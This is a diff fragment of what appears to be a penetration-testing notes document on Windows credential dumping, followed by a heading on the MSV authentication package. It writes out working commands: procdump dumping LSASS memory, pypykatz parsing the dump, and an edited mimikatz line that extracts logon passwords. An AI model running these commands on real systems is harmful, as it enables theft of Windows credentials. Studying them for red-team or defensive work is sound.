@@ -154,7 +154,7 @@ procdump.exe -accepteula -ma lsass.exe lsass.dmp
 pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 
 
-mimikatz.exe "log" "sekurlsa::minidump c:\lsass.dmp" "sekurlsa::logonPasswords" exit
+mimikatz.exe "log" "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit
 ```
 #### MSV
 MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. 
